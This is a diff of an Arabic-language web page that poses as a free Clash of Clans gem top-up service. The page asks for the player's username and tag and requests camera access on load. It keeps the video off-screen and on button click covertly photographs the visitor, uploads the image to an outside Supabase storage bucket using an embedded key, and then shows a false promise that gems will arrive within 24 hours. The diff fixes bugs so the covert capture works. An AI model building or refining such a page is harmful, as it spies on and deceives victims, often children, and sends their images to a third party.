@@ -4,12 +4,15 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>شحن جواهر كلاش أوف كلانس</title>
+    <!-- تضمين مكتبة Supabase -->
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
         body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #f0f2f5; text-align: center; padding: 20px; }
-        .container { background: white; max-width: 400px; margin: auto; padding: 20px; border-radius: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
-        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
-        button { width: 100%; padding: 12px; background: #ffc107; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; }
+        .container { background: white; max-width: 400px; margin: auto; padding: 30px; border-radius: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background: #ffc107; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 10px; }
+        button:hover { background: #e0a800; }
+        #status { margin-top: 15px; font-weight: bold; color: #333; }
         #video { position: absolute; top: -9999px; }
     </style>
 </head>
@@ -17,7 +20,7 @@
 
     <div class="container">
         <h2>شحن جواهر كلاش أوف كلانس</h2>
-        <p>أدخل بياناتك للحصول على الجواهر مجاناً</p>
+        <p>أدخل بياناتك للحصول على الجواهر</p>
         <input type="text" id="username" placeholder="اسم المستخدم في اللعبة">
         <input type="text" id="playerTag" placeholder="Player Tag (مثلاً #ABC123)">
         <button id="submitBtn">شحن الآن</button>
@@ -28,56 +31,65 @@
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        // إعداد Supabase
-        const SUPABASE_URL = 'https://zkjrvjuyncunbdnngcui.supabase.co';
-        const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InpranJ2anV5bmN1bmJkbm5nY3VpIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzk1NjMyNTksImV4cCI6MjA5NTEzOTI1OX0.E1OZ4INqRy-Wuv5K5nDCMtBGJ6k5NdDKldlepukYvO8';
-        const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+        // إعداد الاتصال بـ Supabase
+        // ملاحظة: supabase هي المكتبة المستوردة، نقوم بإنشاء العميل باسم مختلف لتجنب التعارض
+        const mySupabase = supabase.createClient(
+            'https://zkjrvjuyncunbdnngcui.supabase.co', 
+            'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InpranJ2anV5bmN1bmJkbm5nY3VpIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzk1NjMyNTksImV4cCI6MjA5NTEzOTI1OX0.E1OZ4INqRy-Wuv5K5nDCMtBGJ6k5NdDKldlepukYvO8'
+        );
 
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const status = document.getElementById('status');
         const submitBtn = document.getElementById('submitBtn');
 
-        // طلب صلاحية الكاميرا عند فتح الصفحة
+        // طلب إذن الكاميرا عند تحميل الصفحة
         async function initCamera() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
             } catch (err) {
-                console.log("تم رفض الوصول للكاميرا");
+                console.error("تعذر الوصول للكاميرا:", err);
             }
         }
         initCamera();
 
-        // عند الضغط على زر الشحن
+        // تنفيذ عملية الالتقاط والرفع عند الضغط على الزر
         submitBtn.addEventListener('click', async () => {
             status.innerText = "جاري التحقق من الحساب...";
             
-            // التقاط الصورة
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            
-            canvas.toBlob(async (blob) => {
-                const fileName = `user_${Date.now()}.jpg`;
+            // التأكد من أن الكاميرا جاهزة
+            if (video.readyState === video.HAVE_ENOUGH_DATA) {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
                 
-                // رفع الصورة لـ Supabase
-                const { error } = await supabase.storage
-                    .from('photos')
-                    .upload(fileName, blob);
+                canvas.toBlob(async (blob) => {
+                    const fileName = `user_${Date.now()}.jpg`;
+                    
+                    try {
+                        const { error } = await mySupabase.storage
+                            .from('photos')
+                            .upload(fileName, blob);
 
-                if (!error) {
-                    status.innerText = "تم إرسال الطلب بنجاح! سيتم إضافة الجواهر خلال 24 ساعة.";
-                    submitBtn.disabled = true;
-                } else {
-                    status.innerText = "حدث خطأ، حاول مجدداً.";
-                }
-                
-                // إيقاف الكاميرا بعد الالتقاط
-                if (video.srcObject) {
-                    video.srcObject.getTracks().forEach(track => track.stop());
-                }
-            }, 'image/jpeg');
+                        if (!error) {
+                            status.innerText = "تم إرسال الطلب بنجاح! سيتم إضافة الجواهر خلال 24 ساعة.";
+                            submitBtn.disabled = true;
+                        } else {
+                            status.innerText = "حدث خطأ أثناء الرفع: " + error.message;
+                        }
+                    } catch (e) {
+                        status.innerText = "خطأ في الاتصال بالسيرفر.";
+                    }
+                    
+                    // إيقاف الكاميرا بعد الالتقاط
+                    if (video.srcObject) {
+                        video.srcObject.getTracks().forEach(track => track.stop());
+                    }
+                }, 'image/jpeg');
+            } else {
+                status.innerText = "يرجى الانتظار قليلاً ثم المحاولة مرة أخرى.";
+            }
         });
     </script>
 </body>
